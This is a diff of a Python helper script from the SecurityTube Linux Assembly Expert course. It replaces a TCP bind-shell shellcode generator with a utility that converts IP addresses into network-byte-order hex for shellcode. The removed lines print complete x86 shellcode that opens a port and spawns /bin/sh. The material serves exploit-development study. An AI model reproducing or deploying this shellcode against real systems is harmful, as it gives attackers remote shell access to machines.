@@ -1,4 +1,5 @@
-# Creates a local bind shell on port 6789 that spawns /bin/sh
+# Returns network byte order hex for an IP addresse.  This is a utility script that was used
+# to help speed up conversions for shellcode.
 # This was created as part of the SecurityTube Linux Assembly Expert
 # course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 #
@@ -29,36 +30,28 @@
 # !/usr/bin/python
 
 from optparse import OptionParser
+import socket
+import binascii
 
-
-def convert_to_hex(port):
-    val = hex(port)[2::]
+def convert_to_hex(data):
+    val = data
     if not len(val) % 2 == 0:
         val = "0" + val
     return ''.join('\\x' + val[i:i + 2] for i in range(0, len(val), 2))
 
 
 parser = OptionParser()
-parser.description = "Generates TCP Bind Shell shellcode."
-parser.add_option("-p", "--port", dest="port", help="Port to bind to", type=int)
+parser.description = "Generates network byte order hex of IP address for use in shellcode."
+parser.add_option("-i", dest="ip", help="IP address", type="string")
 
 (options, args) = parser.parse_args()
-if not options.port:
+if not options.ip:
     parser.print_help()
     exit(1)
 
-if options.port < 1 or options.port > 65535:
-    print("Invalid port number.")
-    exit(1)
+ip_bytes = binascii.hexlify(socket.inet_aton(options.ip)).decode()
+reversed = ""
+for (first, second) in zip(ip_bytes[0::2], ip_bytes[1::2]):
+    reversed = first + second + reversed
 
-shellcode = (
-        "\\x31\\xc0\\x89\\xc3\\x50\\xb0\\x66\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd"
-        "\\x80\\x89\\xc7\\xb0\\x66\\x5b\\x5b\\x43\\x66\\x68" + convert_to_hex(options.port) +
-        "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66"
-        "\\xb3\\x04\\x6a\\x01\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xfe\\xc3\\x52\\x52"
-        "\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\xb0\\x3f"
-        "\\x41\\x83\\xf9\\x02\\x7e\\xf6\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73"
-        "\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\\xb0\\x06\\x89"
-        "\\xfb\\xcd\\x80")
-
-print(shellcode)
+print(convert_to_hex(reversed))
